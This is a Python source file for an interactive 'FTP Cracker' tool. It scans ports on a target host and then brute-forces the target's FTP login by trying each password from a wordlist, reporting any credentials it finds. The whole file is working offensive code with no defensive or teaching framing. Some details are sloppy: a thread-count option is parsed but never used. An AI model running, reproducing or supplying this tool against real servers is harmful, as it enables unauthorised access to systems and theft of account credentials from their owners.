import ftplib
from threading import Thread
import queue
from colorama import Fore, init as ColoramaInit
import socket
import time
import playsound

# init the console for colors (for Windows)
q = queue.Queue()

def scan(target, ports):
    open_ports = []
    print('\n' + ' Starting Scan For ' + str(target))
    for port in ports.split(','):
        p = int(port)
        print("- Port " + str(p), end=": ")
        if scan_port(target,p):
            open_ports.append(p)
            print(f"{Fore.GREEN}Open " + Fore.RESET)
        else:
            print(f"{Fore.RED}Closed " + Fore.RESET)
    if(len(open_ports) == 0):
        print(f"{Fore.RED} No ports found open {Fore.RESET}")
    else:
        playsound.playsound('found.mp3')

def scan_port(ipaddress, port):
    try:
        sock = socket.socket()
        sock.connect((ipaddress, port))
        sock.close()
        return True
    except:
        return False

def check_ports():
    ip_addr = host
    ports = input("[*] Enter Ports To Scan (split them by ,): ")
    scan(ip_addr.strip(' '), ports)
        
    

def connect_ftp():
    global q
    found = False
    while not found:
        password = q.get()   # get the password from the queue

        server = ftplib.FTP() # initialize the FTP server object

        print("[!] Trying", password)
        try:
            server.connect(host, ftplib.FTP_PORT, timeout=5)    # tries to connect to FTP server with a timeout of 5

            # login using the credentials (user & password)
            server.login(user, password)
        except ftplib.error_perm:
            # login failed, wrong credentials
            pass
        else:
            # correct credentials
            print(f"{Fore.GREEN}[+] Found credentials: ")
            print(f"\tHost: {host}")
            print(f"\tUser: {user}")
            print(f"\tPassword: {password}{Fore.RESET}")
            playsound.playsound('found2.mp3')
            found = True
            # we found the password, let's clear the queue
            with q.mutex:
                q.queue.clear()
                q.all_tasks_done.notify_all()
                q.unfinished_tasks = 0
            time.sleep(5)
        finally:
            #q.task_done()
            # notify the queue that the task is completed for this password
            None


if __name__ == "__main__":
    import argparse
    ColoramaInit()
    parser = argparse.ArgumentParser(description="FTP Cracker using  Python")
    parser.add_argument("host", help="The target host or IP address of the FTP server")
    parser.add_argument("-u", "--user", help="The username of target FTP server")
    parser.add_argument("-p", "--passlist", help="The path of the pass list")
    parser.add_argument("-t", "--threads", help="Number of workers to spawn for logining, default is 30", default=30)
    parser.add_argument("-i", "--interactive", help="Run the program in interactive mode - prompt to ask for each value", action='store_true')
    
    args = parser.parse_args()
    interactive_mode = False
    if args.interactive is not None:
        interactive_mode = True
    # hostname or IP address of the FTP server
    host = args.host
    # username of the FTP server, root as default for linux
    user = args.user
    passlist = args.passlist
    # number of threads to spawn
    n_threads = args.threads

    menu_choice = None
    while(menu_choice != 0):
        print("\n0.Exit")
        print("1.Scan Open Ports")
        print("2.Crack FTP")
        menu_choice = int(input("Enter your choice: "))
        
        if(menu_choice > 2 or menu_choice < 0):
            print(f"{Fore.RED}ERROR: Invalid choice{Fore.RESET}")

        elif menu_choice == 1:
            check_ports()

        elif menu_choice == 2:
            if interactive_mode:
                user = input("Enter username to try: ")
                passlist = input("Enter the passlist file name: ")

            if user is None or passlist is None:
                print(f"{Fore.RED}ERROR: No username or password list specified{Fore.RESET}")
                time.sleep(2)
                interactive_mode = True
                continue

            # read the wordlist of passwords
            passwords = open(passlist).read().split("\n")
            print("[+] Passwords to try:", len(passwords))
            playsound.playsound('hunt.mp3')

            # put all passwords to the queue
            for password in passwords:
                q.put(password)

            if scan_port(host, ftplib.FTP_PORT) == False:
                print(f"{Fore.RED}ERROR: FTP Port (21) is not open on target device{Fore.RESET}")
            else:
                connect_ftp()
                q.join()
